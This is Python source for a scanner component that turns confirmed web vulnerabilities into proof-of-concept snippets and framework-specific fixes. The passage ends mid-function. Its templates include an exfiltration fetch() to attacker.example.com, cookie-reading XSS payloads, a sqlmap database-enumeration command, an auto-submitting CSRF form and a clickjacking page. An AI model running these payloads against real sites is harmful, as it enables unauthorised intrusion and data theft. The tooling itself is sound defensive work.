import re
import json
import logging
import textwrap
from typing import Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


_HEADER_FIXES = {
    "nginx": {
        "X-Frame-Options":           'add_header X-Frame-Options "DENY" always;',
        "X-Content-Type-Options":    'add_header X-Content-Type-Options "nosniff" always;',
        "X-XSS-Protection":          'add_header X-XSS-Protection "1; mode=block" always;',
        "Content-Security-Policy":   "add_header Content-Security-Policy \"default-src 'self'; script-src 'self';\" always;",
        "Strict-Transport-Security": 'add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;',
        "Referrer-Policy":           'add_header Referrer-Policy "strict-origin-when-cross-origin" always;',
        "Permissions-Policy":        'add_header Permissions-Policy "geolocation=(), microphone=(), camera=()" always;',
    },
    "apache": {
        "X-Frame-Options":           'Header always set X-Frame-Options "DENY"',
        "X-Content-Type-Options":    'Header always set X-Content-Type-Options "nosniff"',
        "X-XSS-Protection":          'Header always set X-XSS-Protection "1; mode=block"',
        "Content-Security-Policy":   "Header always set Content-Security-Policy \"default-src 'self';\"",
        "Strict-Transport-Security": 'Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"',
        "Referrer-Policy":           'Header always set Referrer-Policy "strict-origin-when-cross-origin"',
        "Permissions-Policy":        'Header always set Permissions-Policy "geolocation=(), microphone=(), camera=()"',
    },
    "sveltekit": {
        "X-Frame-Options": """\
// svelte.config.js
export default {
  kit: {
    headers: { 'X-Frame-Options': 'DENY' }
  }
};""",
        "X-Content-Type-Options": """\
// svelte.config.js
export default {
  kit: {
    headers: { 'X-Content-Type-Options': 'nosniff' }
  }
};""",
        "Content-Security-Policy": """\
// hooks.server.js
export async function handle({ event, resolve }) {
  const response = await resolve(event);
  response.headers.set('Content-Security-Policy',
    "default-src 'self'; script-src 'self';");
  return response;
}""",
        "Strict-Transport-Security": """\
// hooks.server.js
response.headers.set('Strict-Transport-Security',
  'max-age=31536000; includeSubDomains');""",
        "Referrer-Policy": """\
// hooks.server.js
response.headers.set('Referrer-Policy', 'strict-origin-when-cross-origin');""",
        "Permissions-Policy": """\
// hooks.server.js
response.headers.set('Permissions-Policy',
  'geolocation=(), microphone=(), camera=()');""",
    },
    "next.js": {
        "X-Frame-Options": """\
// next.config.js
module.exports = {
  headers: async () => [{
    source: '/(.*)',
    headers: [{ key: 'X-Frame-Options', value: 'DENY' }]
  }]
};""",
        "Content-Security-Policy": """\
// next.config.js
const cspHeader = "default-src 'self'; script-src 'self' 'unsafe-eval';";
module.exports = {
  headers: async () => [{
    source: '/(.*)',
    headers: [{ key: 'Content-Security-Policy', value: cspHeader }]
  }]
};""",
        "Strict-Transport-Security": "{ key: 'Strict-Transport-Security', value: 'max-age=31536000; includeSubDomains' }",
        "Referrer-Policy":           "{ key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' }",
        "Permissions-Policy":        "{ key: 'Permissions-Policy', value: 'geolocation=(), microphone=(), camera=()' }",
    },
    "express": {
        "X-Frame-Options": """\
// app.js
const helmet = require('helmet');
app.use(helmet.frameguard({ action: 'deny' }));""",
        "Content-Security-Policy": """\
// app.js
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc:  ["'self'"],
  }
}));""",
        "Strict-Transport-Security": "app.use(helmet.hsts({ maxAge: 31536000, includeSubDomains: true }));",
        "Referrer-Policy":           "app.use(helmet.referrerPolicy({ policy: 'strict-origin-when-cross-origin' }));",
        "Permissions-Policy": """\
// app.js
app.use((req, res, next) => {
  res.setHeader('Permissions-Policy', 'geolocation=(), microphone=(), camera=()');
  next();
});""",
    },
    "django": {
        "X-Frame-Options":           "# settings.py\nX_FRAME_OPTIONS = 'DENY'",
        "Content-Security-Policy": """\
# settings.py — install django-csp
MIDDLEWARE = ['csp.middleware.CSPMiddleware', ...]
CSP_DEFAULT_SRC = ("'self'",)
CSP_SCRIPT_SRC  = ("'self'",)""",
        "Strict-Transport-Security": """\
# settings.py
SECURE_HSTS_SECONDS            = 31536000
SECURE_HSTS_INCLUDE_SUBDOMAINS = True
SECURE_HSTS_PRELOAD            = True""",
        "Referrer-Policy":  "# settings.py\nSECURE_REFERRER_POLICY = 'strict-origin-when-cross-origin'",
        "Permissions-Policy": """\
# settings.py — custom middleware
class PermissionsPolicyMiddleware:
    def __call__(self, request):
        response = self.get_response(request)
        response['Permissions-Policy'] = 'geolocation=(), microphone=(), camera=()'
        return response""",
    },
    "fastapi": {
        "X-Frame-Options": """\
# main.py
from starlette.middleware.base import BaseHTTPMiddleware

class SecurityHeadersMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request, call_next):
        response = await call_next(request)
        response.headers['X-Frame-Options'] = 'DENY'
        return response

app.add_middleware(SecurityHeadersMiddleware)""",
        "Content-Security-Policy":   "response.headers['Content-Security-Policy'] = \"default-src 'self';\"",
        "Strict-Transport-Security": "response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'",
    },
    "generic": {
        "X-Frame-Options":           "X-Frame-Options: DENY",
        "X-Content-Type-Options":    "X-Content-Type-Options: nosniff",
        "X-XSS-Protection":          "X-XSS-Protection: 1; mode=block",
        "Content-Security-Policy":   "Content-Security-Policy: default-src 'self';",
        "Strict-Transport-Security": "Strict-Transport-Security: max-age=31536000; includeSubDomains",
        "Referrer-Policy":           "Referrer-Policy: strict-origin-when-cross-origin",
        "Permissions-Policy":        "Permissions-Policy: geolocation=(), microphone=(), camera=()",
    },
}

_EFFORT_MINUTES = {
    "Missing Security Header":           2,
    "Missing Clickjacking Protection":   2,
    "Clickjacking":                      2,
    "CORS Misconfiguration":             10,
    "Information Disclosure":            5,
    "Missing CSRF Protection":           30,
    "Reflected XSS":                     60,
    "Stored XSS":                        120,
    "SQL Injection":                     120,
    "Open Redirect":                     15,
    "Sensitive File Exposed":            5,
    "Protected Administrative Endpoint": 5,
    "default":                           30,
}

_SAFE_SERVER_PATTERNS = re.compile(
    r"^(cloudflare|cloudfront|awselb|fastly|google frontend|"
    r"nginx|apache|lighttpd|iis|openresty|caddy|envoy|traefik)$",
    re.I,
)


def _server_is_leaky(value: str) -> bool:
    """
    Return True only when the Server header value discloses a version or
    meaningful software detail that could aid targeted CVE exploitation.

    Examples:
      "cloudflare"           → False  (CDN label, no version)
      "nginx"                → False  (no version)
      "nginx/1.18.0"         → True   (version exposed)
      "Apache/2.4.51 (Ubuntu)" → True
      "Microsoft-IIS/10.0"   → True
      "WP Rocket 3.19.4"     → True
    """
    v = value.strip()
    if not v:
        return False
    # Contains a version-like substring (digit.digit pattern)
    if re.search(r"\d+\.\d+", v):
        return True
    # Matches a bare safe value with no extra tokens
    if _SAFE_SERVER_PATTERNS.fullmatch(v):
        return False
    # Anything else (unknown software name, composite strings) is leaky
    return True


class ActionAgent:

    def process_all(self, findings: List[Dict],
                    target_url: str,
                    stack: Dict,
                    verbose: bool = False,
                    response_headers: Optional[Dict] = None) -> List[Dict]:
        """
        Generate PoC + fix snippets for every confirmed finding.

        response_headers — the actual HTTP response headers from the target
            (keyed lowercase).  Used by _action_info_disclosure_header() to
            embed the real captured Server / X-Powered-By value in the PoC
            and to gate the finding (only fire when the value is actually leaky).
        """
        if verbose:
            print(f"\n  Action Agent — generating PoCs and fix snippets")

        confirmed      = [f for f in findings if f.get("status") == "Confirmed"]
        stack_keywords = self._infer_stack_keywords(stack)
        hdrs           = {k.lower(): v for k, v in (response_headers or {}).items()}

        if verbose:
            print(f"   Stack keywords: {stack_keywords}")

        actions = []
        for finding in confirmed:
            try:
                action = self._process_finding(
                    finding, target_url, stack_keywords, hdrs
                )
                if action:
                    actions.append(action)
            except Exception as e:
                logger.debug(f"Action generation failed for {finding.get('type','?')}: {e}")

        if verbose:
            print(f"   ✓ Generated {len(actions)} action items ({len(confirmed)} confirmed findings)")

        return actions

    def _infer_stack_keywords(self, stack: Dict) -> List[str]:
        keywords = []
        techs    = stack.get("technologies", [])
        summary  = stack.get("stack_summary", "")

        for t in (techs + [summary]):
            if isinstance(t, str):
                kw = t.lower().split("/")[0].strip()
                if kw:
                    keywords.append(kw)
            elif isinstance(t, dict):
                kw = t.get("name", "").lower().split("/")[0].strip()
                if kw:
                    keywords.append(kw)

        aliases    = {"node.js": "express", "nodejs": "express", "svelte": "sveltekit"}
        normalized = [aliases.get(kw, kw) for kw in keywords]
        return list(dict.fromkeys(normalized))

    def _best_stack_for_header(self, stack_keywords: List[str]) -> str:
        priority = ["sveltekit", "next.js", "express", "django",
                    "fastapi", "nginx", "apache"]
        for fw in priority:
            if fw in stack_keywords:
                return fw
        return "generic"

    def _process_finding(self, finding: Dict,
                          target_url: str,
                          stack_keywords: List[str],
                          response_headers: Dict) -> Optional[Dict]:
        vuln_type = finding.get("type", "")
        severity  = finding.get("severity", "Low")
        location  = finding.get("location", target_url)
        parameter = finding.get("parameter", "")
        evidence  = finding.get("evidence", {})

        if "Missing Security Header" in vuln_type:
            return self._action_missing_header(
                vuln_type, severity, location, stack_keywords, evidence,
                response_headers=response_headers
            )
        elif "Clickjacking" in vuln_type:
            return self._action_clickjacking(location, stack_keywords, evidence)
        elif "CORS" in vuln_type:
            return self._action_cors(location, stack_keywords, evidence)
        elif "Information Disclosure" in vuln_type and "header" in vuln_type.lower():
            return self._action_info_disclosure_header(
                vuln_type, location, stack_keywords, response_headers, evidence
            )
        elif "XSS" in vuln_type or "Cross-Site Scripting" in vuln_type:
            return self._action_xss(vuln_type, location, parameter, evidence, stack_keywords)
        elif "SQL Injection" in vuln_type:
            return self._action_sqli(vuln_type, location, parameter, evidence, stack_keywords)
        elif "Open Redirect" in vuln_type:
            return self._action_open_redirect(location, parameter, evidence)
        elif "CSRF" in vuln_type:
            return self._action_csrf(location, stack_keywords, evidence)
        elif "Sensitive File" in vuln_type or "Protected Administrative" in vuln_type:
            return self._action_sensitive_file(vuln_type, location, stack_keywords, evidence)
        else:
            return self._action_generic(vuln_type, severity, location, evidence)

    # ------------------------------------------------------------------
    # Evidence helpers
    # ------------------------------------------------------------------

    def _evidence_block(self, evidence: Dict, fallback_note: str) -> str:
        """
        Render whatever was actually captured upstream (status code, raw
        request line, raw response snippet, timestamp) as a verbatim block.

        If nothing was captured, return an explicit, unambiguous statement
        that no live evidence is attached — never a string that could be
        mistaken for an observed value.
        """
        if not evidence:
            return f"[NO EVIDENCE CAPTURED — {fallback_note}]"

        lines = []
        if evidence.get("request_line"):
            lines.append(f"Request:  {evidence['request_line']}")
        if evidence.get("status_code") is not None:
            lines.append(f"Status:   {evidence['status_code']}")
        if evidence.get("response_snippet"):
            snippet = evidence["response_snippet"]
            if len(snippet) > 300:
                snippet = snippet[:300] + " …(truncated)"
            lines.append(f"Response: {snippet}")
        if evidence.get("captured_at"):
            lines.append(f"Captured: {evidence['captured_at']}")

        if not lines:
            return f"[NO EVIDENCE CAPTURED — {fallback_note}]"
        return "\n".join(lines)

    def _action_missing_header(self, vuln_type: str, severity: str,
                                location: str,
                                stack_keywords: List[str],
                                evidence: Optional[Dict] = None,
                                response_headers: Optional[Dict] = None) -> Dict:
      
        header       = vuln_type.replace("Missing Security Header:", "").strip()
        stack_key    = self._best_stack_for_header(stack_keywords)
        header_lower = header.lower()
        evidence     = evidence or {}
        hdrs         = {k.lower(): v for k, v in (response_headers or {}).items()}

        status_code = evidence.get("response_status") or evidence.get("status_code")

       
        if not hdrs and status_code is None:
            evidence_block = (
                "Request:\n"
                f"  GET {location}\n\n"
                "Observed Response:\n"
                "  [Response headers were not passed through to the report "
                "renderer for this finding — the header check that confirmed "
                "this finding ran successfully, but its captured headers were "
                "not threaded to this step]\n\n"
                f"Missing:\n"
                f"  - {header}\n\n"
                "Verification Method:\n"
                "  Direct HTTP Header Inspection (see section 3 evidence for "
                "the original capture)"
            )
        else:
            observed_lines = []
            if status_code is not None:
                observed_lines.append(
                    f"HTTP/1.1 {status_code} {'OK' if status_code == 200 else ''}".strip()
                )
            for key in ("server", "content-type", "date"):
                if key in hdrs:
                    display_key = "Server" if key == "server" else (
                        "Content-Type" if key == "content-type" else "Date"
                    )
                    observed_lines.append(f"{display_key}: {hdrs[key]}")

            evidence_block = (
                "Request:\n"
                f"  GET {location}\n\n"
                "Observed Response:\n"
                + "\n".join(f"  {line}" for line in observed_lines) + "\n\n"
                f"Missing Security Header:\n"
                f"  - {header}\n\n"
                "Verification Method:\n"
                "  Direct HTTP Header Inspection"
            )

        impact_text = {
            "content-security-policy": (
                'Impact: Without CSP, inline/injected scripts are not blocked,\n'
                'which widens the blast radius of any XSS found elsewhere.'
            ),
            "x-frame-options": (
                'Impact: Site can be embedded in an iframe — enables clickjacking.\n'
                'See the Clickjacking finding for a full PoC.'
            ),
            "strict-transport-security": (
                'Impact: Without HSTS, a network attacker can attempt to downgrade\n'
                'HTTPS to HTTP on first visit (SSL stripping).'
            ),
            "referrer-policy": (
                'Impact: Full URL (including any query-string tokens) may be sent\n'
                'to third parties via the Referer header.'
            ),
        }.get(header_lower, "Impact: See CWE-693 (Protection Mechanism Failure).")

        poc = f"{evidence_block}\n\n{impact_text}"

        fix_templates = _HEADER_FIXES.get(stack_key, _HEADER_FIXES["generic"])
        fix_snippet   = fix_templates.get(header, header + ": <value>")

        return {
            "finding_type":   vuln_type,
            "severity":       severity,
            "location":       location,
            "attack_poc":     poc,
            "poc_type":       "evidence",
            "evidence_captured": bool(hdrs),
            "fix_snippet":    fix_snippet,
            "fix_language":   self._fix_language(stack_key),
            "fix_context":    self._fix_context(stack_key, header),
            "effort_minutes": _EFFORT_MINUTES["Missing Security Header"],
        }

    def _action_clickjacking(self, location: str,
                              stack_keywords: List[str],
                              evidence: Optional[Dict] = None) -> Dict:
        evidence = evidence or {}
        xfo_present = evidence.get("checked_headers") is not None
        evidence_note = (
            "Captured response had no X-Frame-Options / frame-ancestors CSP directive."
            if xfo_present else
            "[NO EVIDENCE CAPTURED — frame-blocking headers were not verified against a live response]"
        )

        poc = (
            '<!DOCTYPE html>\n'
            '<html>\n'
            '<head><title>Clickjacking PoC</title></head>\n'
            '<body>\n'
            f'  <!-- {evidence_note} -->\n'
            '  <h1>Clickjacking Demonstration</h1>\n'
            '  <p>Target loads inside iframe — proves framing is possible.</p>\n'
            '  <div style="position:relative;width:800px;height:600px;">\n'
            '    <div style="position:absolute;top:0;left:0;'
            'width:100%;height:100%;background:rgba(255,0,0,0.15);'
            'z-index:10;cursor:pointer;"\n'
            "         onclick=\"alert(\'Click intercepted!\')\" >\n"
            '    </div>\n'
            '    <iframe src="' + location + '" width="800" height="600"\n'
            '            style="border:2px solid red;"></iframe>\n'
            '  </div>\n'
            '</body>\n'
            '</html>'
        )

        stack_key   = self._best_stack_for_header(stack_keywords)
        xfo_fix     = _HEADER_FIXES.get(stack_key, _HEADER_FIXES["generic"]).get(
            "X-Frame-Options", "X-Frame-Options: DENY"
        )
        fix_snippet = xfo_fix + "\n# OR use CSP (stronger, preferred):\nContent-Security-Policy: frame-ancestors 'none';"

        return {
            "finding_type":   "Missing Clickjacking Protection",
            "severity":       "Medium",
            "location":       location,
            "attack_poc":     poc,
            "poc_type":       "html",
            "evidence_captured": xfo_present,
            "fix_snippet":    fix_snippet,
            "fix_language":   self._fix_language(stack_key),
            "fix_context":    self._fix_context(stack_key, "X-Frame-Options"),
            "effort_minutes": _EFFORT_MINUTES["Missing Clickjacking Protection"],
        }

    def _action_cors(self, location: str,
                     stack_keywords: List[str],
                     evidence: Optional[Dict] = None) -> Dict:
        evidence = evidence or {}
        reflected_origin = evidence.get("reflected_origin")
        acao_value       = evidence.get("access_control_allow_origin")

        if reflected_origin and acao_value:
            evidence_block = (
                f" Sent Origin header: {reflected_origin}\n"
                f" Server responded:    Access-Control-Allow-Origin: {acao_value}\n"
                f" → Attacker-controlled origin was reflected back."
            )
        else:
            evidence_block = (
                " [NO EVIDENCE CAPTURED — an Origin probe request was not sent/recorded; "
                "this finding is pattern-based only and needs manual confirmation]"
            )

        poc = (
            '# PoC 1: Verify CORS misconfiguration with curl\n'
            'curl -s -I -H "Origin: https://evil-attacker.example.com" \\\n'
            '  ' + location + ' | grep -i "access-control"\n'
            f'{evidence_block}\n\n'
            '# PoC 2: Browser-based cross-origin data theft (if credentials are allowed)\n'
            '# fetch("' + location + '/api/user", { credentials: "include" })\n'
            '#   .then(r => r.text())\n'
            '#   .then(data => fetch("https://attacker.example.com/steal?data=" + btoa(data)));'
        )

        stack_key = self._best_stack_for_header(stack_keywords)

        if "nginx" in stack_keywords:
            fix_snippet = textwrap.dedent("""\
                # nginx.conf
                map $http_origin $cors_origin {
                    default "";
                    "https://your-trusted-domain.com" "$http_origin";
                }
                add_header Access-Control-Allow-Origin $cors_origin always;
                add_header Vary Origin always;""")
            fix_language = "nginx"
            fix_context  = "nginx.conf server block"
        elif "express" in stack_keywords or "node" in stack_keywords:
            fix_snippet = textwrap.dedent("""\
                const cors = require('cors');
                const allowedOrigins = ['https://your-trusted-domain.com'];
                app.use(cors({
                  origin: (origin, callback) => {
                    if (!origin || allowedOrigins.includes(origin)) callback(null, true);
                    else callback(new Error('Not allowed by CORS'));
                  },
                  credentials: true,
                }));""")
            fix_language = "javascript"
            fix_context  = "app.js"
        elif "django" in stack_keywords:
            fix_snippet = textwrap.dedent("""\
                # pip install django-cors-headers
                INSTALLED_APPS = ['corsheaders', ...]
                MIDDLEWARE = ['corsheaders.middleware.CorsMiddleware', ...]
                CORS_ALLOWED_ORIGINS = ['https://your-trusted-domain.com']
                CORS_ALLOW_CREDENTIALS = True""")
            fix_language = "python"
            fix_context  = "settings.py"
        else:
            fix_snippet  = (
                "# Replace: Access-Control-Allow-Origin: *\n"
                "# With:    Access-Control-Allow-Origin: https://your-trusted-domain.com\n"
                "# Never combine wildcard (*) with Allow-Credentials: true"
            )
            fix_language = "text"
            fix_context  = "Web server / application CORS configuration"

        return {
            "finding_type":   "CORS Misconfiguration",
            "severity":       "Medium",
            "location":       location,
            "attack_poc":     poc,
            "poc_type":       "curl",
            "evidence_captured": bool(reflected_origin and acao_value),
            "fix_snippet":    fix_snippet,
            "fix_language":   fix_language,
            "fix_context":    fix_context,
            "effort_minutes": _EFFORT_MINUTES["CORS Misconfiguration"],
        }

    def _action_info_disclosure_header(self, vuln_type: str, location: str,
                                        stack_keywords: List[str],
                                        response_headers: Dict,
                                        evidence: Optional[Dict] = None) -> Optional[Dict]:
     
        is_xpb   = "x-powered-by" in vuln_type.lower()
        header   = "X-Powered-By" if is_xpb else "Server"
        hdr_key  = header.lower()

        captured = response_headers.get(hdr_key, "").strip()

        if captured and not _server_is_leaky(captured):
            logger.debug(
                "action_agent: suppressing server header finding — "
                "value %r is not leaky", captured
            )
            return None

         
        if captured:
            shows_line = f" Captured: {header}: {captured}"
            evidence_captured = True
        else:
            shows_line = (
                f" [NO EVIDENCE CAPTURED — {header} header value was not recorded "
                f"during the scan; re-run with header capture enabled to confirm]"
            )
            evidence_captured = False

        poc = (
            f'curl -I {location} | grep -i "{header}"\n'
            f'{shows_line}\n\n'
            f' Impact: Version/software info in {header} header enables targeted\n'
            f' CVE lookup — attacker narrows exploits to your exact server version.'
        )

        # Fix snippet — stack-aware
        if "nginx" in stack_keywords:
            fix_snippet  = "# nginx.conf\nserver_tokens off;\nmore_clear_headers Server;"
            fix_language = "nginx"
            fix_context  = "nginx.conf"
        elif "apache" in stack_keywords:
            fix_snippet  = "# httpd.conf\nServerTokens Prod\nServerSignature Off\nHeader unset X-Powered-By"
            fix_language = "apache"
            fix_context  = "httpd.conf"
        elif "express" in stack_keywords or "node" in stack_keywords:
            fix_snippet  = "const helmet = require('helmet');\napp.use(helmet());\n// Or: app.disable('x-powered-by');"
            fix_language = "javascript"
            fix_context  = "app.js"
        else:
            fix_snippet  = f"Remove or obscure the {header} response header in your web server configuration."
            fix_language = "text"
            fix_context  = "Web server configuration"

        return {
            "finding_type":   vuln_type,
    
            "severity":       "Low" if evidence_captured else "Low (unconfirmed)",
            "location":       location,
            "attack_poc":     poc,
            "poc_type":       "curl",
            "evidence_captured": evidence_captured,
            "fix_snippet":    fix_snippet,
            "fix_language":   fix_language,
            "fix_context":    fix_context,
            "effort_minutes": _EFFORT_MINUTES["Information Disclosure"],
        }

    def _action_xss(self, vuln_type: str, location: str,
                    parameter: str, evidence: Dict,
                    stack_keywords: List[str]) -> Dict:
        evidence = evidence or {}
        method = evidence.get("confirmation_method", "http_body")
        captured_payload  = evidence.get("payload_sent")
        captured_response = evidence.get("response_snippet")

        if captured_payload and captured_response:
            snippet = captured_response[:300]
            evidence_block = (
                f"# Captured payload sent: {captured_payload}\n"
                f"# Captured response excerpt: {snippet}"
            )
        elif parameter:
            evidence_block = (
                "# [NO RESPONSE SNIPPET CAPTURED — reflection was inferred, "
                "not directly observed in stored evidence]"
            )
        else:
            evidence_block = "# [NO EVIDENCE CAPTURED — manual verification required]"

        if parameter:
            if method in ("js_execution", "dom_reflection"):
                poc = (
                    "# XSS — execution claimed via " + method + "\n"
                    "# Location: " + location + "\n"
                    "# Parameter: " + parameter + "\n"
                    f"{evidence_block}\n"
                    '# Payload tested: "><script>alert(document.cookie)</script>'
                )
            else:
                poc = (
                    "curl -X POST " + '"' + location + '"' + " \\\n"
                    '  --data-urlencode "' + parameter + '=><script>alert(1)</script>"\n'
                    f"{evidence_block}"
                )
        else:
            poc = (
                "# Manual verification required\n"
                "# Location: " + location + "\n"
                f"{evidence_block}\n"
                '# Suggested test payload: "><script>alert(1)</script>'
            )

        if "react" in stack_keywords:
            fix_snippet = textwrap.dedent("""\
                import DOMPurify from 'dompurify';
                // BAD:  <div dangerouslySetInnerHTML={{ __html: userInput }} />
                // GOOD:
                <div dangerouslySetInnerHTML={{
                  __html: DOMPurify.sanitize(userInput)
                }} />
                // Or: <div>{userInput}</div>  // auto-escaped""")
            fix_language = "jsx"
            fix_context  = "Component rendering user input"
        elif "django" in stack_keywords:
            fix_snippet = textwrap.dedent("""\
                {# Django templates auto-escape by default #}
                {# BAD: {{ user_input | safe }} #}
                {# GOOD: #}
                {{ user_input }}""")
            fix_language = "python"
            fix_context  = "Django template"
        else:
            fix_snippet = textwrap.dedent("""\
                function escapeHtml(str) {
                  return str
                    .replace(/&/g, '&amp;')
                    .replace(/</g, '&lt;')
                    .replace(/>/g, '&gt;')
                    .replace(/"/g, '&quot;');
                }""")
            fix_language = "javascript"
            fix_context  = "Server-side output encoding"

        return {
            "finding_type":   vuln_type,
            "severity":       "High",
            "location":       location,
            "attack_poc":     poc,
            "poc_type":       "command",
            "evidence_captured": bool(captured_payload and captured_response),
            "fix_snippet":    fix_snippet,
            "fix_language":   fix_language,
            "fix_context":    fix_context,
            "effort_minutes": _EFFORT_MINUTES["Reflected XSS"],
        }

    def _action_sqli(self, vuln_type: str, location: str,
                     parameter: str, evidence: Dict,
                     stack_keywords: List[str]) -> Dict:
        evidence = evidence or {}
        method = evidence.get("confirmation_method", "pattern")
        tech   = "T" if method == "timing" else "E"

        timing_delta = evidence.get("timing_delta_seconds")
        error_text   = evidence.get("db_error_snippet")
        if method == "timing" and timing_delta is not None:
            evidence_note = f"# Captured timing delta: {timing_delta}s on sleep payload"
        elif error_text:
            evidence_note = f"# Captured DB error in response: {error_text[:200]}"
        else:
            evidence_note = (
                "# [NO EVIDENCE CAPTURED — neither a timing delta nor a DB error "
                "string was recorded; this finding is pattern-based only]"
            )

        poc = (
            f"{evidence_note}\n"
            "sqlmap -u " + '"' + location + '"' + " \\\n"
            '  --data="' + parameter + '=test" \\\n'
            "  --technique=" + tech + " --batch --dbs"
        )

        if "django" in stack_keywords:
            fix_snippet = textwrap.dedent("""\
                # Django ORM is safe by default:
                User.objects.filter(username=username)
                # For raw SQL:
                cursor.execute("SELECT * FROM t WHERE id = %s", [user_id])""")
            fix_language = "python"
            fix_context  = "Django ORM query"
        elif "php" in stack_keywords:
            fix_snippet = textwrap.dedent("""\
                $stmt = $pdo->prepare("SELECT * FROM users WHERE name = ?");
                $stmt->execute([$name]);""")
            fix_language = "php"
            fix_context  = "Database query"
        else:
            fix_snippet  = "connection.query('SELECT * FROM users WHERE id = ?', [userId]);"
            fix_language = "javascript"
            fix_context  = "Database query"

        return {
            "finding_type":   vuln_type,
            "severity":       "Critical",
            "location":       location,
            "attack_poc":     poc,
            "poc_type":       "command",
            "evidence_captured": bool(timing_delta is not None or error_text),
            "fix_snippet":    fix_snippet,
            "fix_language":   fix_language,
            "fix_context":    fix_context,
            "effort_minutes": _EFFORT_MINUTES["SQL Injection"],
        }

    def _action_open_redirect(self, location: str, parameter: str,
                               evidence: Optional[Dict] = None) -> Dict:
        evidence = evidence or {}
        location_header = evidence.get("redirect_location_header")
        if location_header:
            evidence_note = f"# Captured Location header on redirect: {location_header}"
            evidence_captured = True
        else:
            evidence_note = "# [NO EVIDENCE CAPTURED — redirect Location header was not recorded]"
            evidence_captured = False

        poc = (
            f"{evidence_note}\n"
            'curl -I "' + location + '?' + parameter + '=https://evil-attacker.example.com"\n'
            "# Check Location header — should point to attacker domain"
        )
        fix_snippet = textwrap.dedent("""\
            const ALLOWED_HOSTS = ['your-domain.com'];
            function safeRedirect(url, res) {
              try {
                const parsed = new URL(url);
                if (ALLOWED_HOSTS.includes(parsed.hostname)) return res.redirect(url);
              } catch (e) {}
              return res.redirect('/');
            }""")
        return {
            "finding_type":   "Open Redirect",
            "severity":       "Medium",
            "location":       location,
            "attack_poc":     poc,
            "poc_type":       "curl",
            "evidence_captured": evidence_captured,
            "fix_snippet":    fix_snippet,
            "fix_language":   "javascript",
            "fix_context":    "Redirect handler",
            "effort_minutes": _EFFORT_MINUTES["Open Redirect"],
        }

    def _action_csrf(self, location: str,
                     stack_keywords: List[str],
                     evidence: Optional[Dict] = None) -> Dict:
        evidence = evidence or {}
        form_fields = evidence.get("form_field_names")
        if form_fields is not None:
            evidence_comment = (
                f"<!-- Captured form fields: {form_fields} — "
                f"no CSRF token field or anti-CSRF cookie attribute detected -->"
            )
            evidence_captured = True
        else:
            evidence_comment = (
                "<!-- [NO EVIDENCE CAPTURED — form fields were not recorded; "
                "this finding is pattern-based only and requires manual confirmation] -->"
            )
            evidence_captured = False

        poc = (
            "<!DOCTYPE html>\n"
            "<html>\n"
            f"{evidence_comment}\n"
            '<body onload="document.csrf_form.submit()">\n'
            f'  <form name="csrf_form" action="{location}" method="POST">\n'
            '    <input type="hidden" name="action" value="attacker_controlled">\n'
            "  </form>\n"
            "</body>\n"
            "</html>"
        )

        if "django" in stack_keywords:
            fix_snippet  = "MIDDLEWARE = ['django.middleware.csrf.CsrfViewMiddleware', ...]\n# In template: {% csrf_token %}"
            fix_language = "python"
            fix_context  = "settings.py + templates"
        elif "sveltekit" in stack_keywords:
            fix_snippet  = "// svelte.config.js\nexport default { kit: { csrf: { checkOrigin: true } } };"
            fix_language = "javascript"
            fix_context  = "svelte.config.js"
        else:
            fix_snippet = textwrap.dedent("""\
                const csrfToken = crypto.randomBytes(32).toString('hex');
                session.csrfToken = csrfToken;
                // Embed in form: <input type="hidden" name="csrf_token" value="...">
                // Validate: if (req.body.csrf_token !== req.session.csrfToken) return 403;""")
            fix_language = "javascript"
            fix_context  = "Session / form handling"

        return {
            "finding_type":   "Missing CSRF Protection",
            "severity":       "Medium",
            "location":       location,
            "attack_poc":     poc,
            "poc_type":       "html",
            "evidence_captured": evidence_captured,
            "fix_snippet":    fix_snippet,
            "fix_language":   fix_language,
            "fix_context":    fix_context,
            "effort_minutes": _EFFORT_MINUTES["Missing CSRF Protection"],
        }

    def _action_sensitive_file(self, vuln_type: str, location: str,
                                stack_keywords: List[str],
                                evidence: Optional[Dict] = None) -> Dict:
        from urllib.parse import urlparse
        evidence = evidence or {}
        m    = re.search(r"(/\S+)", vuln_type)
        path = m.group(1) if m else urlparse(location).path

        status_code  = evidence.get("status") or evidence.get("status_code") or evidence.get("response_status")
        body_snippet = evidence.get("body_snippet") or evidence.get("response_snippet") or evidence.get("response_body_snippet")

        if status_code is not None:
            request = evidence.get("request", f"GET {location}")

            evidence_comment = (
                f"Request:\n"
                f"  {request}\n\n"
                f"Observed Response:\n"
                f"  HTTP {status_code}"
            )
            if body_snippet:
                evidence_comment += (
                    f"\n\nObserved Body Snippet:\n"
                    f"{body_snippet[:200]}"
                )
            method = evidence.get("method")
            confidence = evidence.get("confidence")

            if method:
                evidence_comment += (
                    f"\n\nVerification Method:\n"
                    f"  {method}"
                )

            if confidence:
                evidence_comment += (
                    f"\n\nConfidence:\n"
                    f"  {confidence}"
                )
                
            evidence_captured = True
        else:
            evidence_comment = (
                " [NO EVIDENCE CAPTURED — response status/body for this path "
                "was not recorded; existence is unconfirmed]"
            )
            evidence_captured = False

        poc = (
            f'{evidence_comment}\n'
            'curl -s -i "' + location + '"'
        )


        is_access_controlled = status_code in (401, 403)

        if is_access_controlled:
            fix_snippet = (
                f" {path} returned HTTP {status_code} — access control is functioning.\n"
                f" No removal needed. Recommended actions:\n"
                f"   1. Confirm {path} requires authentication AND authorization\n"
                f"      (a 403 alone doesn't prove authorization is checked correctly\n"
                f"      post-login — verify with an authenticated low-privilege account).\n"
                f"   2. Ensure {path} is not also reachable via an alternate path/method\n"
                f"      that bypasses the same access control (e.g. trailing slash,\n"
                f"      case variation, or a different HTTP verb).\n"
                f"   3. Monitor for regressions — re-check after deploys that the\n"
                f"      control hasn't been loosened or removed."
            )
            fix_language = "text"
            fix_context  = "Access control verification (no code change required)"
        elif "nginx" in stack_keywords:
            fix_snippet  = "location ~* " + re.escape(path) + " {\n    deny all;\n    return 404;\n}"
            fix_language = "nginx"
            fix_context  = "nginx.conf server block"
        elif "apache" in stack_keywords:
            fix_snippet  = '<Files "' + path.lstrip('/') + '">\n    Require all denied\n</Files>'
            fix_language = "apache"
            fix_context  = ".htaccess"
        else:
